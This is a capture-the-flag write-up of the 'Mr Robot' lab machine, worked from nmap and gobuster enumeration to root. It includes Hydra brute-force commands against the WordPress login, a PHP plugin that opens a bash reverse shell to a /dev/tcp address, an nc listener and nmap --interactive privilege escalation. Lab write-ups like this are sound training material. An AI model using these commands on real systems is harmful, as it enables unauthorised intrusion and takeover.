First thing I did was an nmap scan:

nmap 10.10.122.143 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 05:18 EDT
Nmap scan report for 10.10.122.143
Host is up (0.058s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds



Since ports 80,443 are opened, I opened a browser to see what's inside. 
The website doesn't say much, only mr robot references.

So, after that I used gobuster to find subdomains:

$ gobuster dir -u http://10.10.122.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.122.143
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.122.143/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.122.143/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.122.143/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.122.143/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.122.143/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.122.143/feed/]
/video                (Status: 301) [Size: 235] [--> http://10.10.122.143/video/]
/image                (Status: 301) [Size: 0] [--> http://10.10.122.143/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.122.143/feed/atom/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.122.143/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.122.143/admin/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.122.143/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2671]
/css                  (Status: 301) [Size: 233] [--> http://10.10.122.143/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.122.143/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.122.143/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.122.143/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.122.143/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.122.143/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.122.143/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.122.143/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.122.143/]
Progress: 4964 / 220561 (2.25%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 4972 / 220561 (2.25%)
===============================================================
Finished
===============================================================


The first 200 status was sitemap which doesn't provide much information. We can tell it's wordpress hosted because of /wp-login and /wp-includes
I couldn't do much with /wp-login so I went on to /license just to be called a script kiddie...

Then on readme, I had a clue I was getting closer. 

Finally on robots I had the first answer and another clue with a wordlist.


I downloaded the wordlist:
wget http://10.10.122.143/fsocity.dic







So now it was time some brute-force with hydra to find the right username.

First, I went to burp suite to get the http form.

I typed a random username and a random password and intercepted it with burp suite.

I then sent it to the repeater and got this message:
<div id="login_error">	<strong>ERROR</strong>: Invalid username. <a href="http://10.10.122.143/wp-login.php?action=lostpassword">


Now we can complete the hydra command:
hydra -L fsocity.dic -p test 10.10.122.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"

F=Invalid username tells Hydra to treat this string as a failed attempt
-p test (Just a random password because I'm only looking for the right username.


I found the username Elliot:
hydra -L fsocity.dic -p test 10.10.122.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-09 05:50:25
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.122.143:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[80][http-post-form] host: 10.10.122.143   login: Elliot   password: test


Now I need to find the right http-post-form for the wrong password. I do the same steps in burp suite and i get:
</strong>: The password you entered for the username <strong>Elliot</strong> is incorrect. <a href="

So now: 
hydra -l Elliot -P fsocity.dic 10.10.122.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered for the username"


So this was taking way too long, and I took a look at the hint. Why was this list so long?
I had an idea though. I sorted the wordlist 
sort -u wordlist.txt > newwordlist.txt

I had no idea if this would help me, but it actually did:
[80][http-post-form] host: 10.10.122.143   login: Elliot   password: ER28-0652


Now I'm logged in as an admin on wordpress.
How can I create a reverse shell now? I can create a simple plugin:

<?php
/*
Plugin Name: Shell
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.157.185/1337 0>&1'");
?>



I saved it as shell.php and zipped it:
zip shell.zip shell.php


Now I just upload the plugin and while it uploads I set up a listener for incoming connections with:
nc -lvnp 1337


I run the shell on wordpress and:
nc -lvnp 1337
listening on [any] 1337 ...
connect to [**.**.***.***] from (UNKNOWN) [10.10.122.143] 51885
bash: cannot set terminal process group (1753): Inappropriate ioctl for device
bash: no job control in this shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ 



Then I run a few basic commands:
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ whoami
whoami
daemon
daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-admin$ pwd
pwd
/opt/bitnami/apps/wordpress/htdocs/wp-admin


Now I used this command:
find / -perm -4000 -type f 2>/dev/null
used to search for SUID (Set User ID) files. 

find – the command to search for files.

/ – tells find to start searching from the root directory (i.e., search the entire filesystem).

-perm -4000 – this tells find to look for files with the SUID permission bit set.

-type f – restrict results to regular files (not directories, devices, etc.).

2>/dev/null – redirect standard error (file descriptor 2) to /dev/null, which means:
    Suppress permission-denied errors and other warnings that would otherwise clutter your output when scanning the entire filesystem.

The SUID bit (value 4000) is a special file permission for executables. When a file has the SUID bit set, it runs with the permissions of the file owner, not the user who runs it.
For example, if a file owned by root has the SUID bit, and a normal user runs it, the file runs with root privileges.



aemon@linux:/tmp$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown




/usr/local/bin/nmap 
After checking nmap version:
daemon@linux:/tmp$ /usr/local/bin/nmap --version
/usr/local/bin/nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
daemon@linux:/tmp$ 


This is an older version. The --interactive mode (also called "interactive shell") was deprecated and removed after it was discovered to be exploitable for privilege escalation and other attacks which is still available on this version.
So, we're gonna use that command:
daemon@linux:/tmp$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 


Now we just type !sh
nmap> !sh
!sh
# whoami
whoami
root
# 


I am root. Now we look for the keys:

# find / -name "key-2-of-3.txt" 2>/dev/null
find / -name "key-2-of-3.txt" 2>/dev/null
/home/robot/key-2-of-3.txt
# 


AND


# find / -name "key-3-of-3.txt" 2>/dev/null
find / -name "key-3-of-3.txt" 2>/dev/null
/root/key-3-of-3.txt
# 

















